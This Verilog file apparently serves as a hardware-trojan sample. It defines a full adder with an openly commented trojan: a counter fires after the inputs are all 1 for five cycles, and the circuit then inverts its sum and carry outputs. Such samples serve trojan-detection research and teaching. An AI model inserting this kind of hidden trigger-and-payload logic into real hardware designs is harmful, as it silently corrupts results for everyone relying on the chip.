module half_adder (
    input  a, b,
    output sum, carry
);
    assign sum   = a ^ b;   // XOR for sum
    assign carry = a & b;   // AND for carry
endmodule

module full_adder (
    input        clk,           // Added clock for sequential trigger logic
    input        rst_n,         // Added active-low reset
    input        a, b, cin,
    output reg   sum,
    output reg   cout
);
    wire s1, c1, c2;

    // Half-adder instances
    half_adder ha1 (
        .a(a),
        .b(b),
        .sum(s1),
        .carry(c1)
    );

    half_adder ha2 (
        .a(s1),
        .b(cin),
        .sum(sum_ha2),
        .carry(c2)
    );

    // Trojan trigger counter (synthesizable register)
    reg [2:0] trojan_counter;
    reg       trojan_triggered;

    // Trojan insertion: Counter increments every clock cycle when inputs are all 1
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            trojan_counter    <= 3'd0;
            trojan_triggered  <= 1'b0;
        end else begin
            if (a & b & cin) begin
                if (trojan_counter == 3'd4) begin
                    trojan_triggered <= 1'b1; // Trigger after input condition held 5 times
                end else begin
                    trojan_counter <= trojan_counter + 1'b1;
                end
            end else begin
                trojan_counter   <= 3'd0; // Reset counter if condition breaks
                trojan_triggered <= 1'b0;
            end
        end
    end

    // Sum/carry modification with Trojan payload
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            sum  <= 1'b0;
            cout <= 1'b0;
        end else begin
            if (trojan_triggered) begin
                // Trojan payload: invert sum and carry when triggered
                sum  <= ~sum_ha2;                // <<--- TROJAN: Output corruption
                cout <= ~(c1 | c2);              // <<--- TROJAN: Output corruption
            end else begin
                sum  <= sum_ha2;
                cout <= c1 | c2;
            end
        end
    end

endmodule